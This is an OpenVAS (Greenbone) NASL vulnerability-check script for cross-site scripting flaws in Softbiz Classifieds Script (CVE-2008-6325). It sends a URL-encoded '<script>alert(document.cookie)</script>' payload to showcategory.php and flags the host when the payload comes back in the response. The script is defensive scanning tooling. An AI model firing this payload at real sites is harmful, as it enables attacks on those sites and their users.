###############################################################################
# OpenVAS Vulnerability Test
# $Id: softbiz_classifieds_xss.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Softbiz Classifieds Script Multiple Cross Site Scripting
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Softbiz Classifieds Script is prone to multiple cross-site scripting
  vulnerabilities because it fails to sufficiently sanitize
  user-supplied data.

  An attacker may leverage these issues to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the
  affected site. This may allow the attacker to steal cookie-based
  authentication credentials and to launch other attacks.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100030");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(32569);
 script_cve_id("CVE-2008-6325");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_name("Softbiz Classifieds Script Multiple Cross Site Scripting Vulnerabilities");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";
  url = string(dir, "/showcategory.php?cid=9type=1&keyword=Pouya&radio=%3E%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E");

  if(http_vuln_check(port:port, url:url,pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE)) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
